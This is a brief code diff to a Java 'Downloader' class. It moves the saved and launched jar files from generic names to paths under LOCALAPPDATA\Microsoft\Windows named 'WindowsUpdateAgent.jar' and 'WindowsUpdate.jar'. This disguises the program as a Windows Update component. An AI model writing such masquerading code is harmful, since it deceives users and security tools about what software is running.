@@ -9,8 +9,8 @@ public class Downloader {
     public static void main(String[] args) {
         new Thread(() -> {
             String DOWNLOAD_URL = "";
-            String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\ExampleUpdater.jar";
-            String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Example.jar";
+            String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdateAgent.jar";
+            String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdate.jar";
 
             File file = new File(APP_PATH);
             if (!file.exists()) {
